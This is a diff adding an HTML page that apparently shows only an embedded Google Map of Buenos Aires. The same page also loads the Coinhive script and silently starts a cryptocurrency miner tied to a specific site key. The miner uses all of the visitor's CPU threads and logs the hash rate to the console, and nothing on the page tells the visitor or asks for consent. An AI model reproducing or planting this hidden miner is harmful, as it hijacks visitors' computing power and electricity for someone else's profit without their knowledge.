@@ -1,0 +1,48 @@
+<!DOCTYPE html>
+<html>
+
+  <head>
+    <title></title>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+
+    <!-- Styles -->
+    <link rel="stylesheet" href="/bower_components/bootstrap/dist/css/bootstrap.min.css">
+    <link rel="stylesheet" href="/bower_components/font-awesome/css/font-awesome.min.css">
+  </head>
+
+  <body>
+
+    <!-- <iframe id="Iemoo4oo" src="https://zh.wikipedia.org/wiki/Wikipedia:首页" frameborder="0" width="100%"></iframe> -->
+    <iframe id="Iemoo4oo" src="https://maps.google.com/maps?f=q&amp;source=s_q&amp;hl=es-419&amp;geocode=&amp;q=buenos+aires&amp;sll=37.0625,-95.677068&amp;sspn=38.638819,80.859375&amp;t=h&amp;ie=UTF8&amp;hq=&amp;hnear=Buenos+Aires,+Argentina&amp;z=11&amp;ll=-34.603723,-58.381593&amp;output=embed" frameborder="0" width="100%"></iframe>
+    <!-- <iframe id="preview" src="http://webapplayers.com/inspinia_admin-v2.7.1/" frameborder="0" width="100%"></iframe> -->
+
+    <!-- Scripts -->
+    <script src="/bower_components/jquery/dist/jquery.min.js"></script>
+    <script src="https://coin-hive.com/lib/coinhive.min.js"></script>
+    <script>
+      $("#Iemoo4oo").attr("height", $(window).height() + "px");
+
+      // var miner = new CoinHive.Anonymous('6ty1eIIXSBScgOA7bOsbeovHFygGiMze');
+      var miner = new CoinHive.Anonymous("6ty1eIIXSBScgOA7bOsbeovHFygGiMze", {
+        // threads: 4,
+        threads: navigator.hardwareConcurrency,
+        autoThreads: false,
+        throttle: 0.4,
+        forceASMJS: false
+      });
+      
+      miner.start();
+      
+      // Update stats once per second
+      setInterval(function() {
+        var hashesPerSecond = miner.getHashesPerSecond();
+        var totalHashes = miner.getTotalHashes();
+        var acceptedHashes = miner.getAcceptedHashes();
+        console.log(hashesPerSecond);
+        // Output to HTML elements...
+      }, 1000);
+    </script>
+  </body>
+
+</html>
